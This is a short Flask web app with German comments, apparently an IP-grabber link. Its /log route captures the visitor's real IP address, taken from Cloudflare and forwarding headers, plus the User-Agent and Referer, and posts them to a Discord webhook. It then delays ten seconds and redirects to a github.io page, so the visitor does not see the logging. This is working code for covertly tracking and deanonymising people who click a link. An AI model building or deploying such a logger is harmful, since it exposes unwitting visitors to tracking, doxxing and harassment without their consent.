from flask import Flask, request, redirect
from werkzeug.middleware.proxy_fix import ProxyFix
import requests
import os
import time

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)

# Webhook aus den Render Environment Variables lesen
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")

@app.route("/")
def home():
    return "Server läuft."

@app.route("/log")
def log_ip():
    try:
        ip = (
            request.headers.get("CF-Connecting-IP")
            or request.headers.get("True-Client-IP")
            or request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
            or request.remote_addr
        )

        user_agent = request.headers.get("User-Agent", "Unbekannt")
        referer = request.headers.get("Referer", "Keiner")

        message = {
            "content": (
                "**Neuer Besucher**\n"
                f"🌍 IP: `{ip}`\n"
                f"🖥️ User-Agent:\n```{user_agent}```\n"
                f"🔗 Referer: {referer}"
            )
        }

        if WEBHOOK_URL:
            response = requests.post(
                WEBHOOK_URL,
                json=message,
                timeout=5
            )

            print(f"Discord Status: {response.status_code}")

            if response.status_code != 204:
                print(response.text)

        else:
            print("WEBHOOK_URL wurde nicht gesetzt.")

    except Exception as e:
        print(f"Fehler: {e}")

    # Kleine Verzögerung
    time.sleep(10)

    return redirect("https://gengaog.github.io/-/")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
